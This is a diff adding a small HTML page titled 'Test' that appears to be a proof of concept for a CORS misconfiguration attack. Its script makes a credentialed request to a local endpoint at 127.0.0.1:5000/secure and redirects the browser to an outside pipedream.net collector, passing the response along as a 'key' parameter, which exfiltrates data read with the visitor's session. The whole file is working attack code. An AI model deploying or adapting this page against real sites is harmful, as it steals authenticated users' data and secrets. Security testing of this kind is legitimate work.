@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test</title>
+</head>
+<body>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','http://127.0.0.1:5000/secure',true);
+        req.withCredentials = true;
+        req.send();
+     
+        function reqListener() {
+            location='https://eok69zle14d05s6.m.pipedream.net/log?key='+this.responseText;
+        };
+     </script>
+</body>
+</html>
